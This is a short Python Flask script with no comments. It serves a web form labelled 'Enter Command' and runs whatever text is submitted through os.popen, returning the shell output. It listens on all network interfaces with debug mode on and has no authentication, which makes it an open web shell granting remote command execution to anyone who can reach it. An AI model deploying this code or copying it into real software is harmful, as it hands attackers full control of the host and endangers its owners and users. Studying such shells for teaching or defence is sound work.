#!/usr/bin/env python3

import os
from flask import Flask, request
app = Flask(__name__)


@app.route('/', methods=['POST', 'GET'])
def hello_world():
    if request.method == 'POST':
        command = request.form.get('command')
        stream = os.popen(command)
        return f'result: {stream.read()}'

    content = '''
    <html>
        <body>
            <form action = "/" method = "post">
            <p>Enter Command:</p>
            <p><input type = "command" name = "command" /></p>
            <p><input type = "submit" value = "submit" /></p>
            </form>   
        </body>
    </html>
    '''

    return content


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
